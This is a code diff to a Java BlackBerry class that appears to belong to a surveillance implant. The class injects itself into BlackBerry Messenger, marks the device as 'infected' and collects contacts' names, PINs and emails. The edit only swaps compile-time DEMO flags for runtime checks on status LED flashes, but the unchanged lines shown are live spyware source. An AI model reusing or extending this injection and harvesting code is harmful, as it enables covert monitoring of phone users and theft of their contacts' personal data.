@@ -18,6 +18,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.FieldExplorer;
@@ -109,10 +110,10 @@ public class BBMMenuItem extends ApplicationMenuItem {
             //#ifdef DEBUG
             debug.warn("injectBBM:" + ex.toString());
             //#endif
-            
-            //#ifdef DEMO
-            Debug.ledFlash(Debug.COLOR_RED);
-            //#endif
+
+            if (Status.self().isDemo()) {
+                Debug.ledFlash(Debug.COLOR_RED);
+            }
         }
 
         return null;
@@ -157,9 +158,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
             debug.info("BBM INJECTED!");
             //#endif
 
-            //#ifdef DEMO
-            Debug.ledFlash(Debug.COLOR_GREEN);
-            //#endif
+            if (Status.self().isDemo()) {
+                Debug.ledFlash(Debug.COLOR_GREEN);
+            }
 
             AppInjectorBBM.getInstance().setInfected(true);
 
@@ -171,13 +172,13 @@ public class BBMMenuItem extends ApplicationMenuItem {
             checkScreen(tries - 1);
         } else {
             //#ifdef DEBUG
-            
+
             debug.warn("BBM NOT INJECTED!");
             //#endif
 
-            //#ifdef DEMO
-            Debug.ledFlash(Debug.COLOR_RED);
-            //#endif
+            if (Status.self().isDemo()) {
+                Debug.ledFlash(Debug.COLOR_RED);
+            }
         }
     }
 
@@ -237,9 +238,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
                     users.put(user.toLowerCase(), new User(user, pin, email));
 
-                    //#ifdef DEMO
-                    Debug.ledFlash(Debug.COLOR_ORANGE);
-                    //#endif
+                    if (Status.self().isDemo()) {
+                        Debug.ledFlash(Debug.COLOR_ORANGE);
+                    }
                 }
                 //#ifdef DEBUG
                 debug.trace("closing Contact Profile");
